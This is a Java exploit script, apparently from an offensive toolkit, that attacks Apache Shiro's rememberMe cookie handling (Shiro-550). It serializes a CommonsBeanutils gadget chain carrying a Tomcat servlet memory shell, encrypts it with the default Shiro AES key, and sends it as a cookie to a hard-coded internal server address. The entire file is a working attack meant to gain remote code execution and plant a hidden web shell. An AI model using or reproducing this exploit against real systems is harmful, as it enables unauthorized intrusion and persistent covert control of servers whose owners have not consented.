package xyz.eki.marshalexp.tool;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import xyz.eki.marshalexp.memshell.MTomcatServlet;
import xyz.eki.marshalexp.poc.CB1Shiro;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

public class Shiro550 {
    public final static String key = "kPH+bIxk5D2deZiIxcaaaA==";
    public final static String url = "http://10.3.240.43:8080/htems-manager/index.jsp";
    public final static String cookieName = "rememberMe";
    public static void main(String[] args) throws Exception{
        byte[] payload = SerializeUtils.serialize(new CB1Shiro().getPocObject(MiscUtils.dumpCopyClass(MTomcatServlet.class)));
        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = java.util.Base64.getDecoder().decode(key);
        ByteSource ciphertext = aes.encrypt(payload, keyBytes);

        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url(url)
                .addHeader("Cookie",String.format("%s=%s;",cookieName,ciphertext))
                .get()
                .build();
        try (Response response = client.newCall(request).execute()) {
            String res = response.body().string();
            System.out.println(res);
        }
    }
}
